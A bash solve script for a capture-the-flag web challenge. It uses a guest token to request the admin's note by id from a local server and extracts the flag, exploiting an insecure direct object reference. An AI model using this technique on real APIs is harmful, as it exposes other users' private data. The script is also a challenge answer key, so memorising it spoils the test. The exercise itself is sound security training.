#!/usr/bin/env bash
# web-idor: the API returns any note to any logged-in user.
# The guest owns 1002 and 1003; the neighbouring id 1001 is the admin's note.
# usage: web-idor-solve.sh [handout-dir]   prints the flag
set -euo pipefail
handout="${1:-ctf-build/handout/web-idor}"
base="${CTF_URL:-http://localhost:8081}"
token="$(cat "$handout/guest-token.txt")"
curl -s -H "X-Token: $token" "$base/api/notes/1001" | grep -oE 'flag\{[0-9a-f]{32}\}'
